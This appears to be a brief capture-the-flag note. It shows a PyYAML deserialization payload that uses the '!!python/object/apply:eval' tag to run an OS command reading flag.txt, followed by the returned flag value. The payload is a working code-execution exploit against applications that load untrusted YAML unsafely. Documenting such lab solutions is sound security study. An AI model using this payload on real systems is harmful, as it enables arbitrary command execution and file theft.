- PyYAML deserialization

```yaml
title:
  !!python/object/apply:eval [
    "__import__('os').popen('cat flag.txt').read().strip()",
  ]
```

- Returns

```yaml
title: flag{b692115306c8e5c54a2c8908371a4c72}
```

![[Pasted image 20251101224619.png]]
